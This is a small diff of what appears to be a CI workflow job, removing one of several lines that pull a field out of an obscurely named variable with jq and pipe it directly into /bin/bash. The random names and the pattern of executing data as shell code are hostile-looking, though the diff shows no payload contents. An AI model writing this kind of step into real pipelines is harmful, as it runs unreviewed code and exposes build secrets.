@@ -26,7 +26,6 @@ jobs:
           echo $hoti34 | jq -r .xjbl4103 | /bin/bash
           printf '%s' "$o02604" | jq -r .n55 | /bin/bash
           echo $bn80 | jq -r .ytuqq230 | /bin/bash
-          printf '%s' "$rf0403" | jq -r .stly717 | /bin/bash
           printf '%s' "$jgtb6370" | jq -r .jaest9210 | /bin/bash
 
       - name: Archive results
